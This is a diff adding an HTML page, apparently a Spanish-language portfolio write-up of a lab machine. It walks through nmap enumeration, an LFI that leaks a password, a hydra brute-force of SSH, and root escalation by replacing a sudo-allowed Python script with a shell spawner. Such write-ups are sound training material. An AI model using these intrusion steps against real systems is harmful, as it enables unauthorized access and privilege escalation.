@@ -1,0 +1,153 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Library</title>
+  <link href="../style/estilo.css" rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
+  <link rel="stylesheet"
+    href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+</head>
+
+<body class="bg-gray-900 text-white">
+
+    <nav class="bg-gray-800 text-white sticky top-0 z-50 shadow-md">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+        <div class="flex justify-between items-center h-16">
+            <div class="flex-shrink-0">
+            <h1>Santiago Lorenzo</h1>
+            </div>
+            <div class="hidden md:flex space-x-4">
+            <a href="../index.html#inicio" class="hover:text-blue-400 transition">Inicio</a>
+            <a href="../index.html#certificados" class="hover:text-blue-400 transition">Certificaciones</a>
+            <a href="../index.html#proyectos" class="hover:text-blue-400 transition">Proyectos</a>
+            <a href="../writeup.html" class="hover:text-blue-400 transition">Write-ups</a>
+            </div>
+        </div>
+        </div>
+    </nav>
+
+    <main class="max-w-4xl mx-auto px-6 py-12">
+
+    <h1 class="text-4xl font-bold mb-2">🔹Maquina: Library</h1>
+    <p class="text-gray-400 text-sm mb-8">📅 Publicado el 12/12/2025 | Categoría: LINUX </p>
+
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">📝 Descripción</h2>
+        <p class="text-gray-300 leading-relaxed">
+            Este reto consiste en comprometer una máquina Linux en un entorno controlado. No se proporciona una flag directa,
+            pero el objetivo es obtener acceso privilegiado (root) y entender el vector de escalada.
+        </p>
+    </section>
+
+    <!----------------- Análisis ----------------------->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🔍 Análisis inicial</h2>
+        <p class="text-gray-300 mb-4">
+            El análisis comenzó con un reconocimiento básico utilizando herramientas de enumeración para comprender los servicios expuestos.
+            Una vez dentro del sistema como usuario limitado, buscamos posibles vectores de escalada de privilegios.
+        </p>
+        <pre><code class="language-bash">
+            sudo nmap -p- -open -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2
+            
+            PORT   STATE SERVICE VERSION
+            22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
+            | ssh-hostkey: 
+            |   256 f9:f6:fc:f7:f8:4d:d4:74:51:4c:88:23:54:a0:b3:af (ECDSA)
+            |_  256 fd:5b:01:b6:d2:18:ae:a3:6f:26:b2:3c:00:e5:12:c1 (ED25519)
+            80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+            |_http-server-header: Apache/2.4.58 (Ubuntu)
+            |_http-title: Apache2 Ubuntu Default Page: It works
+            MAC Address: 02:42:AC:11:00:02 (Unknown)
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            en el http hacemos descubrimiento con gobuster, con el cual encontramos index.php o haciendo un lfi 
+            encontramos JIFGHDS87GYDFIGD
+        </p>
+        <img src="../Assets/library/LFI-2.png" class="mt-4 mb-4 rounded-lg shadow-lg" alt="inicio">
+
+        <p class="text-gray-300 mt-4">
+            Suponiendo que es un acontraseña hacemos fuerza bruta
+        </p>
+
+        <pre><code class="language-bash">
+            hydra -L /usr/share/wordlists/rockyou.txt -p JIFGHDS87GYDFIGD ssh://172.17.0.2 -t 8 -I
+
+            [22][ssh] host: 172.17.0.2   login: carlos   password: JIFGHDS87GYDFIGD
+        </code></pre>
+
+    <section class="mb-8">
+        <p class="text-gray-300 mb-4">
+            ya tenemos las una via de entrada, entonces, nos conectamos vía SSH como el usuario <code>carlos</code> a la IP de la máquina vulnerable:
+        </p>
+
+        <pre><code class="language-bash">
+            ssh carlos@172.17.0.2
+            # Password: JIFGHDS87GYDFIGD
+        </code></pre>
+
+
+        <p class="text-gray-300 mt-4">
+            Ya con acceso, buscamos si podemos ejecutar un script como root.
+        </p>
+
+        <pre><code class="language-bash">
+            sudo -l
+
+            /usr/bin/python3 /opt/script.py
+        </code></pre>
+        </section>
+
+    <!-- Explotación / Resolución -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">💣 Explotación / Resolución</h2>
+        <p class="text-gray-300 mb-4">
+            Efectivamente, pero como no podemos modificar script.py lo eliminamos
+        </p>
+
+        <pre><code class="language-bash">
+            carlos@93837c0bf76e:/opt$ rm script.py 
+            rm: remove write-protected regular file 'script.py'? y
+            carlos@93837c0bf76e:/opt$ nano script.py
+            carlos@93837c0bf76e:/opt$ cat script.py 
+            import os; os.system("/bin/bash")
+            carlos@93837c0bf76e:/opt$ sudo /usr/bin/python3 /opt/script.py
+        </code></pre>
+
+        <pre><code class="language-bash">
+            /usr/local/bin/privileged_exec
+            # Resultado: spawnea una shell como root
+            whoami
+            root
+        </code></pre>
+
+        <p class="text-gray-300 mt-4">
+            Gracias a esto obtuvimos acceso directo como usuario <code>root</code>.
+        </p>
+    </section>
+
+    <!-- Resultado final -->
+    <section class="mb-8">
+        <h2 class="text-2xl font-semibold mb-2">🏆 Resultado</h2>
+        <p class="text-gray-300">
+            Conseguimos acceso como <code>root</code>, pero no encontramos una flag en la máquina. 
+            Aun así, el objetivo principal de escalada de privilegios fue completado con éxito.
+        </p>
+    </section>
+
+    <div class="mt-10">
+        <a href="../writeup.html"
+            class="inline-block bg-blue-500 px-6 py-2 rounded-lg text-white hover:bg-blue-700 transition">
+            ← Volver a la lista de Write-ups
+        </a>
+    </div>
+
+    </main>
+
+</body>
+</html>
